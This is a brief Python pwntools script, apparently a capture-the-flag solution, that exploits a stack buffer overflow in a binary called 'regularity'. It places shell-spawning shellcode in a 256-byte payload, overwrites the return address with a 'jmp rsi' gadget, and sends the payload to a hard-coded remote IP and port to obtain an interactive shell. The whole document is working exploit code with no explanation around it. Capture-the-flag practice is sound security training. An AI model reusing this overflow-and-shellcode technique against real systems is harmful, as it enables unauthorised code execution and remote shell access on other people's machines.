from pwn import *

context.binary = exe = ELF("./regularity", checksec=False)
# p = process("./regularity")
# context.terminal = ['tmux', 'splitw', '-h']
# gdb.attach(p, gdbscript = "")
if args.LOCAL:
    p = process(exe.path)
else:
    p = remote('83.136.254.55', 56267)

offset = b"A" * 256
# jmp_rsi = p64(0x401041)
jmp_rsi = next(exe.search(asm('jmp rsi')))

shellcode = asm(shellcraft.sh())

pay = shellcode + b"A" * (256 - len(shellcode)) + p64(jmp_rsi)

# p.recvline()
p.send(pay)
p.interactive()